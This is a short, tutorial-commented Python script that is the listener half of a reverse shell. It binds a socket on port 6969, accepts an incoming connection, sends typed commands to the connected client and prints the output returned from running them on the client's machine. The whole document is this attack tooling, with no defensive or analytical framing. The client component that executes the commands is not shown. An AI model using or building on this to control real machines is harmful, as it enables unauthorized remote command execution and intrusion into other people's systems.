import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object

s.bind(('0.0.0.0', 6969)) # use bind method. takes tuple as argument ('<IP>', <PORT>)

s.listen() # start listening for a connection

print("Listening...")

conn, addr = s.accept() # accept the connection. returns a connection object and address object

# print("Connection " + str(conn))
print("Connection received from " + addr[0])

while True:
    command = input("$ ")

    if command == "exit": # if the given command is "exit" then close the connection and break out of the loop
        conn.send(command.encode("UTF-8")) # but first send it to the client so it closes connection too
        s.close()
        break

    # with the connection object, send the input command (encoded from UTF-8 to bytes)
    conn.send(command.encode("UTF-8"))

    # store in the response variable the output from the command run on the client side
    response = conn.recv(4096).decode("UTF-8")

    if response == "no output":# if the command doesnt have output dont try to print anything and iterate again
        print("") 
    else:
        # receive the output of the command and print it to the screen
        print(response) # every time we get something from a socket its going to be bytes so we have to decode it
